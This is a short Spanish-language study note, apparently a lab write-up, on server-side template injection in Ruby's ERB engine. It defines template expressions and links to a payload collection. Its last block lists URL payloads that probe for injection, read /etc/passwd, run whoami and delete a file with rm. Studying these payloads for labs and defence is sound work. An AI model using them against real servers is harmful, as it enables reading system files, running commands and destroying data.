# Server-Side Template Injection 

Tags: #SSTI #Ruby 

```bash 
- ERB (Embedded Ruby): Es un sistema de plantillas qie incorpora Ruby en un documento de texto. A menudo se utiliza para incrustar código Ruby en un documento HTML, similar a ASP y JSP, PHP y otros lenguajes de programación del lado del servidor.   

- Placeholder: Es la forma de indicar que ahí se insertará un contenido de forma dinámica (muchos frameworks webs o sistemas de plantillas emplean esta palabra normalmente en su documentación). Sin embargo, una vez se comienza a investigar SSTI, tanto Jinja2 o motores como Twig, Nunjucks o Liquid, entre otros, no describe {{...}} como placeholder, sino somo: 
	1. Template Expression 
	2. Interpolation 
	3. Output Tag 


[[Plantilla]]
	<p>Hola, {{ username }}</p> (placeholder) 


[[Motores de plantilla]]
	Python: Jinja2 -> {{7*7}}
	Ruby: ERB -> <%= 7*7 %>
```

## SSTI básica en plantilla del servidor

* [SSTI Ruby](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Ruby/)

```bash 
En este lab se aprovecha una vulnerabilidad de Server-Side Template Injection (SSTI) en Ruby (ERB), donde la aplicación evalúa contenido enviado por el usuario sin validación. Mediante la sintaxis de plantillas de ERB, demostramos la ejecución de código del lado servidor, logrando eliminar un archivo del sistema con un simple payload.

Un ejemplo claro de cómo una mala interpolación de plantillas puede poner en peligro la integridad del servidor.
```

```bash 
# Para este lab se coloca la inyección en la URL

	http://web.com/?message=<%= 7*7 %>     # Verificar si existe la inyección

	http://web.com/?message=<%= File.open('/etc/passwd').read %>   # Abrir un archivo especifico como /etc/passwd

	http://web.com/?message=<%=(`whoami`)%>          # Ejecutar código 
	http://web.com/?message=<%=(`rm file.txt`)%>     # Borrar un archivo 
```